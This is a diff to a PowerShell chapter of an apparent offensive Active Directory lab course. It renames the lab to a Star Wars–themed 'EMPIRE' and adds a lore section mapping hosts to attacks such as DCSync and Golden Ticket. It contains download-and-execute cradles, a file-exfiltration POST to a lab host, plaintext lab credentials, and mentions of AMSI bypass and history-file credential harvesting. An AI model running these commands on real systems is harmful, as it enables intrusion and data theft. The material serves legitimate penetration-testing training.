@@ -1,10 +1,10 @@
 # 03 — PowerShell: From `Write-Host` to PowerView
 
-PowerShell is the language of Windows administration and the language of Windows offense. Every modern AD attack tool either *is* PowerShell, wraps PowerShell, or talks to APIs that PowerShell uses. This chapter takes you from "what's a cmdlet" to running PowerView against DVAD, with everything in between.
+PowerShell is the language of Windows administration and the language of Windows offense. Every modern AD attack tool either *is* PowerShell, wraps PowerShell, or talks to APIs that PowerShell uses. This chapter takes you from "what's a cmdlet" to running PowerView against EMPIRE, with everything in between.
 
 We assume you've never touched PowerShell. If you know it well: skim §3.0–§3.5, jump to §3.10 onward.
 
-> Reminder: DVAD is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.
+> Reminder: EMPIRE is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.
 
 ---
 
@@ -54,8 +54,8 @@ The second version is filtered by **value of the `Status` property**, not by str
 
 Windows 10+ / Server 2016+ ship with two PowerShells side by side:
 
-- `powershell.exe` — **Windows PowerShell 5.1** (preinstalled, legacy, .NET Framework). The version every DVAD target uses by default.
-- `pwsh.exe` — **PowerShell 7+** (separate install, cross-platform, .NET 6/7/8). Not on DVAD lab hosts.
+- `powershell.exe` — **Windows PowerShell 5.1** (preinstalled, legacy, .NET Framework). The version every EMPIRE target uses by default.
+- `pwsh.exe` — **PowerShell 7+** (separate install, cross-platform, .NET 6/7/8). Not on EMPIRE lab hosts.
 
 Versions matter because:
 
@@ -130,7 +130,7 @@ PS HKLM:\…\Run> Get-ChildItem -Path Env:USERPROFILE
 PS HKLM:\…\Run> Set-Location C:\
 ```
 
-For DVAD, this is huge: registry recon and modification (e.g., reading `FullSecureChannelProtection`, writing autorun keys) is the same syntax as file I/O.
+For EMPIRE, this is huge: registry recon and modification (e.g., reading `FullSecureChannelProtection`, writing autorun keys) is the same syntax as file I/O.
 
 ---
 
@@ -295,7 +295,7 @@ function Foo {
 
 ```
 $user = "peter.parker"
-Invoke-Command -ComputerName dc01 -ScriptBlock { Get-ADUser $using:user }
+Invoke-Command -ComputerName coruscant -ScriptBlock { Get-ADUser $using:user }
 ```
 
 Without `$using:`, the scriptblock has no access to `$user` from the calling session.
@@ -436,7 +436,7 @@ Single-quoted here-string for literal multi-line content:
 
 ```
 $ps1 = @'
-$secret = "DVADlab2024!"
+$secret = "EmpireLab2024!"
 Get-ADUser -Filter * 
 '@
 ```
@@ -458,12 +458,12 @@ The `-f` operator follows .NET's composite formatting. `{0:N2}` for 2 decimals, 
 PowerShell's `-match` / `-replace` use .NET regex (`System.Text.RegularExpressions.Regex`):
 
 ```
-PS> "peter.parker@corp.local" -match '(?<u>[^@]+)@(?<d>.+)'
+PS> "peter.parker@empire.local" -match '(?<u>[^@]+)@(?<d>.+)'
 True
 PS> $matches.u
 peter.parker
 PS> $matches.d
-corp.local
+empire.local
 
 PS> "abc123" -replace '(\D+)(\d+)','$2-$1'
 123-abc
@@ -587,7 +587,7 @@ function Get-CompromisedUser {
         [string]$Identity,
 
         [Parameter()]
-        [string]$Server = "dc01.corp.local",
+        [string]$Server = "coruscant.empire.local",
 
         [Parameter()]
         [int]$Timeout = 30
@@ -738,8 +738,8 @@ Defenders detect these via 4688 process creation with command line capture, or P
 Two cmdlets that change your life:
 
 ```
-PS> Invoke-Command -ComputerName dc01 -ScriptBlock { hostname; whoami }
-PS> Enter-PSSession -ComputerName dc01      # interactive remote shell
+PS> Invoke-Command -ComputerName coruscant -ScriptBlock { hostname; whoami }
+PS> Enter-PSSession -ComputerName coruscant      # interactive remote shell
 ```
 
 These use **WS-Management (WinRM)** — HTTP on 5985, HTTPS on 5986. Same protocol Ansible and `evil-winrm` use. The endpoint on the server is implemented by `WinRM` service hosting PowerShell as a SOAP/PSRP shell.
@@ -748,16 +748,16 @@ These use **WS-Management (WinRM)** — HTTP on 5985, HTTPS on 5986. Same protoc
 
 ```
 $cred = Get-Credential                                       # prompts (interactive only)
-$sec  = ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force
+$sec  = ConvertTo-SecureString 'EmpireLab2024!' -AsPlainText -Force
 $cred = New-Object PSCredential('corp\peter.parker', $sec)
 
-Invoke-Command -ComputerName dc01 -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName coruscant -Credential $cred -ScriptBlock { whoami }
 ```
 
 Once you have a session:
 
 ```
-$s = New-PSSession -ComputerName dc01 -Credential $cred
+$s = New-PSSession -ComputerName coruscant -Credential $cred
 Invoke-Command -Session $s -ScriptBlock { ... }
 Enter-PSSession -Session $s
 Remove-PSSession $s
@@ -777,23 +777,23 @@ WinRM supports:
 
 ### The double-hop problem
 
-You connect to `dc01` over WinRM. From inside that session, you try to access `\\file01\share`. It fails: "Access denied," even though your domain creds are valid.
+You connect to `coruscant` over WinRM. From inside that session, you try to access `\\scarif\share`. It fails: "Access denied," even though your domain creds are valid.
 
-**Why:** by default, your creds reach `dc01` but `dc01` is not allowed to re-authenticate to another machine on your behalf — that would be delegation, and only Kerberos delegation (constrained or unconstrained) allows it. NTLM has no delegation. Default WinRM does not enable CredSSP.
+**Why:** by default, your creds reach `coruscant` but `coruscant` is not allowed to re-authenticate to another machine on your behalf — that would be delegation, and only Kerberos delegation (constrained or unconstrained) allows it. NTLM has no delegation. Default WinRM does not enable CredSSP.
 
 **Fixes:**
 
-- **CredSSP** — `Enable-WSManCredSSP -Role Client -DelegateComputer dc01` on your box and `-Role Server` on dc01. Then `Invoke-Command -Authentication CredSSP -Credential $cred`. Server now has your plaintext credentials in memory, which is the security cost.
-- **Kerberos delegation** — set up Resource-Based Constrained Delegation (RBCD) or unconstrained delegation on dc01. Production-clean.
+- **CredSSP** — `Enable-WSManCredSSP -Role Client -DelegateComputer coruscant` on your box and `-Role Server` on coruscant. Then `Invoke-Command -Authentication CredSSP -Credential $cred`. Server now has your plaintext credentials in memory, which is the security cost.
+- **Kerberos delegation** — set up Resource-Based Constrained Delegation (RBCD) or unconstrained delegation on coruscant. Production-clean.
 - **Use a Kerberos ticket** — if you have a valid TGT and it's flagged forwardable, you can S4U2Self/S4U2Proxy via tools. Beyond chapter 3 scope.
-- **Pass plaintext credentials inside the scriptblock** — `Invoke-Command -ComputerName dc01 { net use \\file01\share /user:corp\peter.parker DVADlab2024! }`. Works but echoes creds; loud.
+- **Pass plaintext credentials inside the scriptblock** — `Invoke-Command -ComputerName coruscant { net use \\scarif\share /user:corp\peter.parker EmpireLab2024! }`. Works but echoes creds; loud.
 
-In DVAD, several lateral paths run into the double-hop. When they do, the lab usually has unconstrained delegation on a member server to abuse (DF-006 / LAT-018 territory).
+In EMPIRE, several lateral paths run into the double-hop. When they do, the lab usually has unconstrained delegation on a member server to abuse (DF-006 / LAT-018 territory).
 
 ### Configuration trivia
 
 ```
-PS> Test-WSMan -ComputerName dc01
+PS> Test-WSMan -ComputerName coruscant
 PS> winrm enumerate winrm/config/listener
 PS> Get-Item WSMan:\localhost\Client\TrustedHosts
 PS> Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
@@ -804,7 +804,7 @@ PS> Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 ### Running scripts on many hosts
 
 ```
-$targets = "ws01","sql01","file01"
+$targets = "tatooine","kamino","scarif"
 Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
     Get-CimInstance Win32_OperatingSystem | Select-Object PSComputerName, Caption, BuildNumber
 } -ThrottleLimit 10
@@ -836,7 +836,7 @@ PS> Get-ADUser -Filter * | Select-Object SamAccountName, Enabled
 PS> Get-ADGroup -Identity "Domain Admins"
 PS> Get-ADGroupMember "Domain Admins" -Recursive
 PS> Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate
-PS> Get-ADObject -Filter 'objectClass -eq "user"' -SearchBase "OU=ServiceAccounts,DC=corp,DC=local"
+PS> Get-ADObject -Filter 'objectClass -eq "user"' -SearchBase "OU=ServiceAccounts,DC=empire,DC=local"
 PS> Get-ADTrust -Filter *
 ```
 
@@ -869,17 +869,17 @@ PS> $s.FindAll() | ForEach-Object {
 The connection uses the current user's Kerberos context against the closest DC. To target a specific server or use alt credentials:
 
 ```
-PS> $root = [adsi]"LDAP://10.10.0.10/DC=corp,DC=local"
+PS> $root = [adsi]"LDAP://10.10.0.10/DC=empire,DC=local"
 PS> $root.Path
 PS> $s = [adsisearcher]::new($root, "(samaccountname=peter.parker)")
 PS> $s.FindOne().Properties
 
 # With alternate credentials:
-PS> $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://10.10.0.10/DC=corp,DC=local","corp\peter.parker","DVADlab2024!"
+PS> $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://10.10.0.10/DC=empire,DC=local","corp\peter.parker","EmpireLab2024!"
 PS> $s = [adsisearcher]::new($de, "(samaccountname=peter.parker)")
 ```
 
-The Kali equivalent is `ldapsearch -H ldap://10.10.0.10 -D 'CORP\peter.parker' -w '…' -b 'DC=corp,DC=local' '(samaccountname=peter.parker)'`.
+The Kali equivalent is `ldapsearch -H ldap://10.10.0.10 -D 'EMPIRE\peter.parker' -w '…' -b 'DC=empire,DC=local' '(samaccountname=peter.parker)'`.
 
 ### LDAP filter syntax (mirror to chapter 04)
 
@@ -888,7 +888,7 @@ The Kali equivalent is `ldapsearch -H ldap://10.10.0.10 -D 'CORP\peter.parker' -
 (&(objectClass=user)(objectCategory=person))
 (|(samaccountname=peter.parker)(samaccountname=tony.stark))
 (!(objectClass=group))
-(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)
+(memberOf=CN=Domain Admins,CN=Users,DC=empire,DC=local)
 (&(objectClass=user)(servicePrincipalName=*))
 (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
 (&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))
@@ -905,7 +905,7 @@ The Kali equivalent is `ldapsearch -H ldap://10.10.0.10 -D 'CORP\peter.parker' -
 The 1941 rule is gold:
 
 ```
-(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)
+(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=empire,DC=local)
 ```
 
 That returns *everyone in Domain Admins through any nesting depth*. Without 1941, you'd need to traverse manually.
@@ -951,11 +951,11 @@ PS> . C:\Users\Public\pv.ps1
 PS> Invoke-RestMethod -Uri http://10.10.0.1/PowerView.ps1 | Invoke-Expression
 ```
 
-Defender on a real host will alert immediately. DVAD ships Defender off across all targets — exactly so you can exercise PowerView without engagement-of-EDR.
+Defender on a real host will alert immediately. EMPIRE ships Defender off across all targets — exactly so you can exercise PowerView without engagement-of-EDR.
 
 ### Killer cmdlets
 
-| PowerView | What it does | DVAD use |
+| PowerView | What it does | EMPIRE use |
 |---|---|---|
 | `Get-Domain` / `Get-NetDomain` | Domain info | basic recon |
 | `Get-DomainController` | List DCs | basic recon |
@@ -1034,7 +1034,7 @@ PowerShell script-block logging (event 4104 in `Microsoft-Windows-PowerShell/Ope
 
 Module logging (event 4103) records pipeline calls. Transcription writes a per-session text file. The three together give defenders a near-complete view of what happened in PowerShell.
 
-In DVAD, Defender (and therefore AMSI's primary backend) is disabled on all member servers and DCs. So you'll see *no* `4104` block on your shells. On `ws01` it's enabled — try the AMSI bypass and watch the event log via `Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational -MaxEvents 5`.
+In EMPIRE, Defender (and therefore AMSI's primary backend) is disabled on all member servers and DCs. So you'll see *no* `4104` block on your shells. On `tatooine` it's enabled — try the AMSI bypass and watch the event log via `Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational -MaxEvents 5`.
 
 ---
 
@@ -1055,7 +1055,7 @@ Bypasses (research, mostly historical):
 - **PoshC2 in CLM-aware mode** — uses only CLM-legal primitives.
 - **Custom runspaces with FullLanguage** — `[runspacefactory]::CreateRunspace()` with explicit language mode. Blocked when CLM is active.
 
-DVAD does not enforce CLM anywhere. Mentioned for awareness on real engagements.
+EMPIRE does not enforce CLM anywhere. Mentioned for awareness on real engagements.
 
 ---
 
@@ -1126,10 +1126,10 @@ Anything you can do in C# you can do in PowerShell because .NET classes are firs
 [System.Net.WebClient]::new().DownloadString("http://10.10.0.1/x")
 [System.Net.WebRequest]::Create("http://10.10.0.1/y").GetResponse()
 [System.Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello"))
-[System.DirectoryServices.DirectoryEntry]::new("LDAP://DC=corp,DC=local")
+[System.DirectoryServices.DirectoryEntry]::new("LDAP://DC=empire,DC=local")
 [System.Security.Principal.WindowsIdentity]::GetCurrent()
 [System.Security.Principal.WindowsBuiltInRole]::Administrator
-[System.Net.Dns]::GetHostEntry("dc01.corp.local")
+[System.Net.Dns]::GetHostEntry("coruscant.empire.local")
 [System.Net.IPAddress]::Parse("10.10.0.10")
 [System.Guid]::NewGuid()
 [System.Math]::Pow(2,10)
@@ -1200,7 +1200,7 @@ $results = $jobs | ForEach-Object {
 $pool.Close(); $pool.Dispose()
 ```
 
-You don't need to write this from scratch in DVAD — `nxc`, `crackmapexec`, `Invoke-PortScan` (PowerView) do it for you.
+You don't need to write this from scratch in EMPIRE — `nxc`, `crackmapexec`, `Invoke-PortScan` (PowerView) do it for you.
 
 PS 7's `ForEach-Object -Parallel` is a friendlier wrapper:
 
@@ -1227,7 +1227,7 @@ That single line:
 
 Variants use `-EncodedCommand`, BITS transfer (`Start-BitsTransfer`), DNS exfil (custom), or named pipes for the second stage.
 
-For DVAD you do not need a C2. Direct PowerShell over evil-winrm covers everything. Awareness is for reading attacker artefacts when you eventually do the defender exercises.
+For EMPIRE you do not need a C2. Direct PowerShell over evil-winrm covers everything. Awareness is for reading attacker artefacts when you eventually do the defender exercises.
 
 ---
 
@@ -1245,7 +1245,7 @@ Anything an admin typed (including embedded passwords in `New-Object PSCredentia
 PS> Get-Content (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
 ```
 
-In DVAD, an admin's history on `ws01` contains a credential you'll want — that's CRED-022 (cross-reference PLAN.md).
+In EMPIRE, an admin's history on `tatooine` contains a credential you'll want — that's CRED-022 (cross-reference PLAN.md).
 
 ---
 
@@ -1297,7 +1297,7 @@ $body = @{ file = [Convert]::ToBase64String($bytes) }
 Invoke-RestMethod -Uri http://10.10.0.1/u -Method Post -Body $body
 ```
 
-Keep this card. Most of your DVAD session will be one of these.
+Keep this card. Most of your EMPIRE session will be one of these.
 
 ---
 
@@ -1440,7 +1440,7 @@ Then:
 
 ```
 *Evil-WinRM* PS> $targets = @('10.10.0.10','10.10.0.13','10.10.0.14','10.10.0.100')
-*Evil-WinRM* PS> $cred = New-Object PSCredential('corp\peter.parker', (ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force))
+*Evil-WinRM* PS> $cred = New-Object PSCredential('corp\peter.parker', (ConvertTo-SecureString 'EmpireLab2024!' -AsPlainText -Force))
 *Evil-WinRM* PS> Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
                     [pscustomobject]@{
                         Host = $env:COMPUTERNAME
@@ -1487,3 +1487,85 @@ If access denied on some hosts, that's expected (peter.parker isn't admin everyw
 - **Microsoft Docs — *WinRM Authentication*** — for double-hop and CredSSP details.
 
 Next: [04-active-directory.md](04-active-directory.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
